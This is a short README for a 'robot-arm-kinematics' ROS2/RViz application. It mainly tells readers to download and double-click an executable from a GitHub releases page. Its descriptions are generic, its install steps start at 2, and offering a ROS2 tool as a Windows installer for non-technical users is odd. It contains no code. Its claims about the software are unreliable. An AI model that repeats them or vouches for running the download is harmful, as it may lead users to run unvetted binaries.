# 🤖 robot-arm-kinematics - Easily Control a Robot Arm

## 🚀 Getting Started

Welcome to the **robot-arm-kinematics** project! This application helps you solve forward and inverse kinematics for robot arms using ROS2 and RViz. It is perfect for students and hobbyists who want to explore robotics without diving deep into programming.

## 💻 Download the Application

Visit this page to download: [GitHub Releases](https://github.com/7rap/robot-arm-kinematics/releases)

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/7rap/robot-arm-kinematics/releases)

## 📂 System Requirements

Before you begin, ensure your system meets the following requirements:

- **Operating System:** Windows 10 or later, macOS, or Linux
- **RAM:** 4 GB or more
- **Processor:** Dual-core processor or better
- **Software:** ROS2 and RViz installed

## 📥 Download & Install

2. Look for the latest release. 
3. Download the file suitable for your operating system. For example, if you are using Windows, you might find a file named `robot_arm_kinematics_windows.exe`.
4. Once the download completes, locate the downloaded file. 
5. Double-click the file to start the installation process.
6. Follow the on-screen instructions to install the application.

## 📘 Using the Application

After installation, you can start using the software:

1. Open the application from your applications folder or start menu.
2. Connect the robot arm as per the setup instructions. Ensure all connections are secure.
3. Launch ROS2 and RViz. 
4. Input your kinematic parameters into the interface.
5. Click the "Calculate" button to see the results for both forward and inverse kinematics.

## 🎓 Understanding Kinematics

Kinematics is the branch of mechanics that deals with the motion of objects. In the context of robotics, it helps in understanding how to control the robot arm. This application simplifies the process for you.

### Forward Kinematics

Forward kinematics calculates the position of the end effector of the robot arm based on given joint angles. With this application, simply enter the angles to see where the end of the arm will be.

### Inverse Kinematics

Inverse kinematics calculates the joint angles needed to reach a specific position in space. Enter the desired position and the application will provide the necessary angles for each joint.

## 🛠 Features

- User-friendly interface, designed for non-technical users.
- Calculates both forward and inverse kinematics easily.
- Compatibility with ROS2 and RViz for enhanced functionalities.
- Visual representation of the robot arm's positions.
- Support for multiple robot arm configurations through URDF.

## 🌐 Topics Covered

- **Forward Kinematics**: Understand how the robot arm moves based on angles.
- **Inverse Kinematics**: Learn how to position the robot arm at a specific point.
- **ROS and RViz**: Explore this powerful robotics framework and its visualization tool.

## ⚙️ Troubleshooting

If you encounter issues while running the application, try the following steps:

1. Ensure your system meets the requirements listed above.
2. Double-check that ROS2 and RViz are installed correctly.
3. Reinstall the application if you face persistent errors.
